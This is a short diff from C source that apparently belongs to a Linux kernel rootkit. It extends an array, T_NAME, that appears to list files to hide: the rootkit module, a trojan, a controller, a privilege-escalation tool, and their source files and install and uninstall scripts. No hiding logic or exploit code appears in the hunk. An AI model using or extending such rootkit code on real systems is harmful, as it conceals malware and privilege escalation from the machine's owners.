@@ -159,7 +159,7 @@ static struct module *save_mod;
 
 static int activated = 0;
 
-char *T_NAME[] = {"rootkit.ko", "trojan_hello", "controller", "priv_esc"};
+char *T_NAME[] = {"rootkit.ko", "trojan_hello", "controller", "priv_esc", "log.txt", "controller.c", "elevate", "install", "install.sh", "priv_esc.c", "rootkit.c", "uninstall.sh", "uninstall"};
 static int t_name_len = sizeof(T_NAME)/sizeof(T_NAME[0]);
 
 /*
